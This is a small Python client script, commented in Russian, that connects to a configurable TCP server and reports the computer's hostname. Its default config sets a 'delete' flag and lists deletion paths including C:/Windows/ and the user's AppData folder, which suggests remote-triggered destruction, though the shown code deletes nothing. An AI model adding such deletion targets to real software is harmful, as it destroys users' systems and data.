#!/usr/bin/env python3
import random
import socket
import configparser
from sys import argv

# Инициализация файла конфигурации
config = configparser.ConfigParser()
config.read('client_config.ini')
try:
    if(config['CONFIG']):
        pass
except:
    config['CONFIG'] = {
        'config' : 'config' ,
        'server_ip':'10.0.20.200',
        'server_port':'49999',
        'running':'False',
        'recon':'5',
        'debug':'False',
        'delete':'True'
    }

    config['DELETE_PATH'] = {
        'dp' : 'first',
        'test' : './test/',
        'test1' : './test1/',
        'windows' : 'C:/Windows/',
        'local' : '&appdata&/../Local/'
    }

    with open('client_config.ini', 'w') as configfile:
        config.write(configfile)

# Настройки

server_IP = config['CONFIG']['server_ip']           # Адрес сервера
server_PORT = int(config['CONFIG']['server_port'])  # Порт сервера

recon = int(config['CONFIG']['recon'])              # Количество попыток переподключения к серверу
con = False     # Переменная подключения

sa = argv[1:]                   # Получение аргументов для запуска скрипта

myname = socket.gethostname()   # Имя клиента (имя компьютера)

# Перебор ключени и работа с ними
if (sa != []):
    i = 0
    while i < len(sa):
        # если аргумент --port или -p, то меняем порт на указанный
        if ((sa[i] == '--port') or (sa[i] == '-p')):
            server_PORT = int(sa[i+1])

        # То же самое для IP
        if (sa[i] == '--ip'):
            server_IP = sa[i+1]

        if (sa[i] == '--recon'):
            recon = int(sa[i+1])

        i += 1

# Подключение к серверу
i = 1
while i <= recon:
    print(f'{i} попытка подключения к {server_IP}:{server_PORT}')
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        server.connect((server_IP, server_PORT))

        start_message = 'name:' + myname + ';'
        check_message = 'check:check;'
        server.send(f'{start_message}{check_message}'.encode())

        con = True
        print('Соединение установленно!')
        break
    except:
        con = False

    i += 1

if (con == False):
    print('Подключение к серверу отсутствует')

server.close()

input('Нажмите Enter для выхода')